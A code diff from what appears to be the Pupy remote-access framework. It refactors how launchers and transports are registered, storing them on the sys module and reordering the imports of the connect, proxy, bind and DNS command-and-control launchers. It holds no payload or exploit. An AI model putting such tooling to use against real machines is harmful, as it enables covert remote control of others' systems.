@@ -6,37 +6,16 @@
 import logging
 import importlib
 
-launchers = {}
+import sys
 
-try:
-    from .lib.launchers.connect import ConnectLauncher
-    launchers['connect'] = ConnectLauncher
-except Exception, e:
-    logging.exception('%s: ConnectLauncher disabled', e)
+if not hasattr(sys, 'pupy_launchers'):
+    setattr(sys, 'pupy_launchers', {})
 
-try:
-    from .lib.launchers.auto_proxy import AutoProxyLauncher
-    launchers['auto_proxy'] = AutoProxyLauncher
-except Exception, e:
-    logging.exception('%s: AutoProxyLauncher disabled', e)
+if not hasattr(sys, 'pupy_transports'):
+    setattr(sys, 'pupy_transports', {})
 
-try:
-    from .lib.launchers.bind import BindLauncher
-    launchers['bind'] = BindLauncher
-except Exception, e:
-    logging.exception('%s: BindLauncher disabled', e)
-
-try:
-    from .lib.launchers.dnscnc import DNSCncLauncher
-    launchers.update({
-        'dnscnc': DNSCncLauncher
-    })
-
-except Exception as e:
-    logging.exception('%s: DNSCncLauncher disabled', e)
-    DNSCncLauncher = None
-
-transports = {}
+transports = sys.pupy_transports
+launchers = sys.pupy_launchers
 
 def add_transport(module_name):
     try:
@@ -91,3 +70,31 @@ except ImportError:
 
     for loader, module_name, is_pkg in pkgutil.iter_modules(trlib.__path__):
         add_transport(module_name)
+
+try:
+    from .lib.launchers.connect import ConnectLauncher
+    launchers['connect'] = ConnectLauncher
+except Exception, e:
+    logging.exception('%s: ConnectLauncher disabled', e)
+
+try:
+    from .lib.launchers.auto_proxy import AutoProxyLauncher
+    launchers['auto_proxy'] = AutoProxyLauncher
+except Exception, e:
+    logging.exception('%s: AutoProxyLauncher disabled', e)
+
+try:
+    from .lib.launchers.bind import BindLauncher
+    launchers['bind'] = BindLauncher
+except Exception, e:
+    logging.exception('%s: BindLauncher disabled', e)
+
+try:
+    from .lib.launchers.dnscnc import DNSCncLauncher
+    launchers.update({
+        'dnscnc': DNSCncLauncher
+    })
+
+except Exception as e:
+    logging.exception('%s: DNSCncLauncher disabled', e)
+    DNSCncLauncher = None
